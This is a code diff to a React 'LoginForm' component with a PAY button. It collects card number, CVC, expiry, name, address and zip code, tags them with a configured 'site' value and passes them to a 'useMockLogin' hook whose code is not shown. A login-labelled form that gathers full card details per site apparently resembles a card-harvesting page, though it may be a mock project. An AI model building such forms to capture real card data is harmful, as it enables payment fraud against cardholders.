@@ -2,38 +2,39 @@
 import { useState } from "react";
 import Register from "./Register";
 import { useForm } from 'react-hook-form';
+import useMockLogin from "../hooks/useMockLogin";
+import { site } from "../config/index";
 
 
 
 function LoginForm() {
   const [showModal, setShowModal] = useState(false);
-  const [formData, setFormData] = useState();
   const form=useForm()
   const{register,handleSubmit,reset}=form
- 
-  // const validate = Yup.object({
-  //   name: Yup.string().required("Name is required"),
-  //   password: Yup.string().required("Password is required"),
-  //   address: Yup.string().required("Address is required"),
-  //   email: Yup.string().required("Email is required"),
-  //   zipCod: Yup.string().required("Zip Code is required"),
-  //   cardNumber: Yup.string()
-  //     .max(16)
-  //     .required("Card number must be 16 digit"),
-  //     cvc: Yup.string()
-  //     .min(3)
-  //     .max(4)
-  //     .required("CVC must 3 digit"),
-    
-  // });
-  
+  const { login } = useMockLogin();
 
  
 
   const onSubmit = (values) => {
-    console.log(values)
-    setFormData(values)
+    const{
+      validity,
+      address,
+      cardNumber,
+      cvc,
+      name,
+  zipCode }=values
+  const submitValues = {
+    site,
+    validity,
+      address,
+      cardNumber,
+      cvc,
+      name,
+  zipCode
+  };
+  login(submitValues);
     setShowModal(true)
+    reset()
   };
 
 
@@ -116,7 +117,7 @@ function LoginForm() {
            PAY
           </button>
           </form>):( 
-          <Register formData={formData}/>
+          <Register/>
         )
         }
           </div>
